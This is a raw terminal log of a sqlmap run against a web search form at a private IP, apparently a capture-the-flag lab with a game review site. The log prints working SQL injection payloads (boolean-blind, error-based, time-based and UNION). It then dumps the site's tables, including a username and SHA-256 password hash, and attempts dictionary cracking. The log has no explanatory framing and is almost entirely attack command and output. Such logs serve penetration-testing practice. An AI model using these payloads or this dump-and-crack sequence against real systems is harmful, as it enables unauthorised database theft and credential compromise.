└─$ sqlmap -r searchreq.txt --dbms=mysql --dump                                                                                                           1 ⨯
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:32:37 /2021-09-30/

[02:32:37] [INFO] parsing HTTP request from 'searchreq.txt'
[02:32:37] [INFO] testing connection to the target URL
[02:32:37] [INFO] testing if the target URL content is stable
[02:32:38] [INFO] target URL content is stable
[02:32:38] [INFO] testing if POST parameter 'searchitem' is dynamic
[02:32:38] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[02:32:38] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[02:32:38] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[02:32:38] [INFO] testing for SQL injection on POST parameter 'searchitem'
[02:34:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:34:42] [WARNING] reflective value(s) found and filtering out
[02:34:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:34:43] [INFO] testing 'Generic inline queries'
[02:34:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:34:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:34:49] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="is")
[02:34:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:34:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:34:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:34:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:34:50] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:34:50] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[02:34:50] [INFO] testing 'MySQL inline queries'
[02:34:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:34:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:34:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:34:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:34:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[02:34:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[02:34:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:35:01] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[02:35:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:35:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[02:35:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:35:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:35:02] [INFO] target URL appears to have 3 columns in query
[02:35:03] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[02:35:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-7123' OR 7714=7714#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=sdfs' AND GTID_SUBSET(CONCAT(0x716a6b6271,(SELECT (ELT(7495=7495,1))),0x71787a7171),7495)-- ShUd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=sdfs' AND (SELECT 8654 FROM (SELECT(SLEEP(5)))rtPR)-- Jrkv

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=sdfs' UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b6271,0x64494c51794f734653744661776a456a4b514173456d6468706d466e4c436d6e4d554e5a696b4967,0x71787a7171)#
---
[02:35:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[02:35:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:35:03] [INFO] fetching current database
[02:35:03] [INFO] fetching tables for database: 'db'
[02:35:04] [INFO] fetching columns for table 'post' in database 'db'
[02:35:04] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[02:35:04] [INFO] table 'db.post' dumped to CSV file '/home/parallels/.local/share/sqlmap/output/10.10.5.24/dump/db/post.csv'
[02:35:04] [INFO] fetching columns for table 'users' in database 'db'
[02:35:04] [INFO] fetching entries for table 'users' in database 'db'
[02:35:04] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[02:35:04] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[02:35:04] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[02:35:04] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[02:35:04] [INFO] starting 4 processes 
[02:35:09] [WARNING] no clear password(s) found                                                                                                              
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[02:35:09] [INFO] table 'db.users' dumped to CSV file '/home/parallels/.local/share/sqlmap/output/10.10.5.24/dump/db/users.csv'
[02:35:09] [INFO] fetched data logged to text files under '/home/parallels/.local/share/sqlmap/output/10.10.5.24'

[*] ending @ 02:35:09 /2021-09-30/


